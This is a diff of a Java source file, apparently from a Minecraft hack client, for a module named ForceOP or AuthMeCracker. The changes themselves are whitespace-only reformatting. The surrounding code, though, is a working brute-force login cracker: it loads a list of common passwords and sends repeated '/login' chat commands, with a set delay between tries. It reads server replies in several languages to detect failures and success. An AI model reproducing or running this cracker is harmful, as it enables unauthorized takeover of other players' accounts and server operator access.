@@ -1,6 +1,6 @@
 /*
  * Copyright © 2014 - 2015 | Alexander01998 | All rights reserved.
- *
+ * 
  * This Source Code Form is subject to the terms of the Mozilla Public
  * License, v. 2.0. If a copy of the MPL was not distributed with this
  * file, You can obtain one at http://mozilla.org/MPL/2.0/.
@@ -44,17 +44,17 @@ public class ForceOP extends Module
 				+ "\"How to use\" button. That will open an online\n"
 				+ "tutorial where I explained how to use it.\n"
 				+ "Don't message me on this!",
-				0,
-				Category.CHAT);
+			0,
+			Category.CHAT);
 	}
-
+	
 	@Override
 	public String getName()
 	{
 		Client.wurst.fileManager.loadOptions();
 		return Client.wurst.options.renameForceOPEvenThoughTheNameIsTechnicallyCorrect ? "AuthMeCracker" : "ForceOP";
 	}
-
+	
 	private String[] defaultList =
 	{
 		"password",
@@ -108,7 +108,7 @@ public class ForceOP extends Module
 		"fuckyou",
 	};
 	private String[] passwords = {};
-
+	
 	private JDialog dialog;
 	private JLabel lPWList;
 	private JRadioButton rbDefaultList;
@@ -126,11 +126,11 @@ public class ForceOP extends Module
 	private JLabel lPasswords;
 	private JLabel lTime;
 	private JButton bStart;
-
+	
 	private boolean gotWrongPWMSG;
 	private int lastPW;
 	private JLabel lAttempts;
-
+	
 	@Override
 	public void onEnable()
 	{
@@ -157,17 +157,17 @@ public class ForceOP extends Module
 						Client.wurst.moduleManager.getModuleFromClass(ForceOP.class).setToggled(false);
 					}
 				});
-
+				
 				lPWList = new JLabel("Password list");
 				lPWList.setLocation(4, 4);
 				lPWList.setSize(lPWList.getPreferredSize());
 				dialog.add(lPWList);
-
+				
 				rbDefaultList = new JRadioButton("default", Client.wurst.options.forceOPList.equals(Client.wurst.fileManager.wurstDir.getPath()));
 				rbDefaultList.setLocation(4, 24);
 				rbDefaultList.setSize(rbDefaultList.getPreferredSize());
 				dialog.add(rbDefaultList);
-
+				
 				rbTXTList = new JRadioButton("TXT file", !rbDefaultList.isSelected());
 				rbTXTList.setLocation(rbDefaultList.getX() + rbDefaultList.getWidth() + 4, 24);
 				rbTXTList.setSize(rbTXTList.getPreferredSize());
@@ -187,11 +187,11 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(rbTXTList);
-
+				
 				ButtonGroup bgList = new ButtonGroup();
 				bgList.add(rbDefaultList);
 				bgList.add(rbTXTList);
-
+				
 				bTXTList = new JButton("browse");
 				bTXTList.setLocation(rbTXTList.getX() + rbTXTList.getWidth() + 4, 24);
 				bTXTList.setSize(bTXTList.getPreferredSize());
@@ -220,7 +220,7 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(bTXTList);
-
+				
 				bHowTo = new JButton("How to use");
 				bHowTo.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 16));
 				bHowTo.setSize(bHowTo.getPreferredSize());
@@ -241,22 +241,22 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(bHowTo);
-
+				
 				sepListSpeed = new JSeparator();
 				sepListSpeed.setLocation(4, 56);
 				sepListSpeed.setSize(498, 4);
 				dialog.add(sepListSpeed);
-
+				
 				lSpeed = new JLabel("Speed");
 				lSpeed.setLocation(4, 64);
 				lSpeed.setSize(lSpeed.getPreferredSize());
 				dialog.add(lSpeed);
-
+				
 				lDelay1 = new JLabel("Delay between attempts:");
 				lDelay1.setLocation(4, 84);
 				lDelay1.setSize(lDelay1.getPreferredSize());
 				dialog.add(lDelay1);
-
+				
 				spDelay = new JSpinner();
 				spDelay.setToolTipText
 					(
@@ -280,12 +280,12 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(spDelay);
-
+				
 				lDelay2 = new JLabel("ms");
 				lDelay2.setLocation(spDelay.getX() + spDelay.getWidth() + 4, 84);
 				lDelay2.setSize(lDelay2.getPreferredSize());
 				dialog.add(lDelay2);
-
+				
 				cbDontWait = new JCheckBox("<html>Don't wait for \"<span style=\"color: rgb(192, 0, 0);\"><b>Wrong password!</b></span>\" messages</html>", Client.wurst.options.forceOPDontWait);
 				cbDontWait.setToolTipText("Increases the speed but can cause inaccuracy.");
 				cbDontWait.setLocation(4, 104);
@@ -301,32 +301,32 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(cbDontWait);
-
+				
 				sepSpeedStart = new JSeparator();
 				sepSpeedStart.setLocation(4, 132);
 				sepSpeedStart.setSize(498, 4);
 				dialog.add(sepSpeedStart);
-
+				
 				lName = new JLabel("Username: " + Minecraft.getMinecraft().session.getUsername());
 				lName.setLocation(4, 140);
 				lName.setSize(lName.getPreferredSize());
 				dialog.add(lName);
-
+				
 				lPasswords = new JLabel("Passwords: error");
 				lPasswords.setLocation(4, 160);
 				lPasswords.setSize(lPasswords.getPreferredSize());
 				dialog.add(lPasswords);
-
+				
 				lTime = new JLabel("Estimated time: error");
 				lTime.setLocation(4, 180);
 				lTime.setSize(lTime.getPreferredSize());
 				dialog.add(lTime);
-
+				
 				lAttempts = new JLabel("Attempts: error");
 				lAttempts.setLocation(4, 200);
 				lAttempts.setSize(lAttempts.getPreferredSize());
 				dialog.add(lAttempts);
-
+				
 				bStart = new JButton("Start");
 				bStart.setFont(new Font(bHowTo.getFont().getName(), Font.BOLD, 18));
 				bStart.setLocation(506 - 192 - 12, 144);
@@ -379,10 +379,10 @@ public class ForceOP extends Module
 										}
 										if(Minecraft.getMinecraft().thePlayer == null)
 											gotWrongPWMSG = true;// If you get
-																	// kicked,
-																	// it won't
-																	// wait for
-																	// "Wrong password!".
+										// kicked,
+										// it won't
+										// wait for
+										// "Wrong password!".
 									}
 									try
 									{
@@ -394,19 +394,19 @@ public class ForceOP extends Module
 									boolean sent = false;
 									while(!sent)
 										try
-									{
+										{
 											Minecraft.getMinecraft().thePlayer.sendChatMessage("/login " + passwords[i]);
 											sent = true;
-									}catch(Exception e)
-									{
-										try
+										}catch(Exception e)
 										{
-											Thread.sleep(50);
-										}catch(InterruptedException e1)
-										{
-											e1.printStackTrace();
+											try
+											{
+												Thread.sleep(50);
+											}catch(InterruptedException e1)
+											{
+												e1.printStackTrace();
+											}
 										}
-									}
 									lastPW = i + 1;
 									update();
 								}
@@ -416,7 +416,7 @@ public class ForceOP extends Module
 					}
 				});
 				dialog.add(bStart);
-
+				
 				loadPWList();
 				update();
 				Minecraft.getMinecraft().setIngameNotInFocus();
@@ -425,12 +425,12 @@ public class ForceOP extends Module
 			}
 		}.start();
 	}
-
+	
 	private void loadPWList()
 	{
 		if(rbTXTList.isSelected() && !Client.wurst.options.forceOPList.equals(Client.wurst.fileManager.wurstDir.getPath()))
 			try
-		{
+			{
 				File pwList = new File(Client.wurst.options.forceOPList);
 				BufferedReader load = new BufferedReader(new FileReader(pwList));
 				ArrayList<String> loadedPWs = new ArrayList<String>();
@@ -438,18 +438,18 @@ public class ForceOP extends Module
 					loadedPWs.add(line);
 				load.close();
 				passwords = loadedPWs.toArray(new String[loadedPWs.size()]);
-		}catch(IOException e)
-		{
-			e.printStackTrace();
-			JOptionPane.showMessageDialog(dialog, "Error: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
-			return;
-		}
+			}catch(IOException e)
+			{
+				e.printStackTrace();
+				JOptionPane.showMessageDialog(dialog, "Error: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
+				return;
+			}
 		else
 			passwords = defaultList;
 		lPasswords.setText("Passwords: " + (passwords.length + 1));
 		lPasswords.setSize(lPasswords.getPreferredSize());
 	}
-
+	
 	private void update()
 	{
 		long timeMS = (passwords.length + 1 - lastPW) * (Integer)spDelay.getValue();
@@ -470,7 +470,7 @@ public class ForceOP extends Module
 		lAttempts.setText("Attempts: " + (lastPW + 1) + "/" + (passwords.length + 1));
 		lAttempts.setSize(lAttempts.getPreferredSize());
 	}
-
+	
 	@Override
 	public void onReceivedMessage(String message)
 	{
@@ -482,13 +482,13 @@ public class ForceOP extends Module
 			|| message.toLowerCase().contains("mauvais")// French
 			|| message.toLowerCase().contains("mal")// Spanish
 			|| message.toLowerCase().contains("sbagliato")// Italian
-			)
+		)
 			gotWrongPWMSG = true;
 		else if(message.toLowerCase().contains("success")// English & Italian
 			|| message.toLowerCase().contains("erfolg")// Deutsch!
 			|| message.toLowerCase().contains("succès")// French
 			|| message.toLowerCase().contains("éxito")// Spanish
-			)
+		)
 		{
 			String password;
 			if(lastPW == -1)
@@ -507,12 +507,12 @@ public class ForceOP extends Module
 			|| message.toLowerCase().contains("eingelogt"))
 			Client.wurst.chat.warning("It looks like you are already logged in.");
 	}
-
+	
 	private boolean hasGotWrongPWMSG()
 	{
 		return gotWrongPWMSG;
 	}
-
+	
 	@Override
 	public void onDisable()
 	{
